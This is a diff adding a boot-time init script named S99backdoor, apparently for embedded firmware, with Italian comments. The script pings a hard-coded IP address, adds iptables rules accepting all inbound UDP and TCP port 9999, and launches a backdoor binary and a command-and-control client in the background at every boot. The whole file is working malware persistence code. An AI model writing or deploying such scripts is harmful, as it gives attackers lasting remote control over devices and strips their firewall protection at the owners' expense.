@@ -1,0 +1,53 @@
+#!/bin/sh
+# /etc/init.d/S99backdoor
+# Avviato da inittab con ::sysinit
+
+NAME="backdoor"
+C2_CLIENT="/bin/c2_client"
+BACKDOOR="/bin/backdoor"
+LOG_FILE="/var/${NAME}.log"
+TEST_SERVER="62.94.192.84"
+
+# Assicura /var e log
+mkdir -p /var
+touch "$LOG_FILE"
+
+log() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
+}
+
+# Attendi la rete (max ~30s)
+wait_for_network() {
+    log "Attendo la rete..."
+
+    for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
+        if ping -c1 -W2 "$TEST_SERVER" >/dev/null 2>&1; then
+            log "Rete disponibile"
+            return 0
+        fi
+        sleep 2
+    done
+
+    log "Rete non disponibile, continuo comunque"
+    return 1
+}
+
+# ==== MAIN ====
+
+log "=== Avvio servizio $NAME ==="
+
+wait_for_network
+log "Apro UDP per tutti"
+iptables -I INPUT 1 -p udp -j ACCEPT
+
+log "Apro 9999 TCP per backdoor"
+iptables -I INPUT -p tcp --dport 9999 -j ACCEPT
+
+log "Avvio backdoor"
+$BACKDOOR >> "$LOG_FILE"_backdoor 2>&1 &
+
+log "Avvio c2_client"
+$C2_CLIENT >> "$LOG_FILE"_c2 2>&1 &
+
+log "Avvio completato"
+exit 0
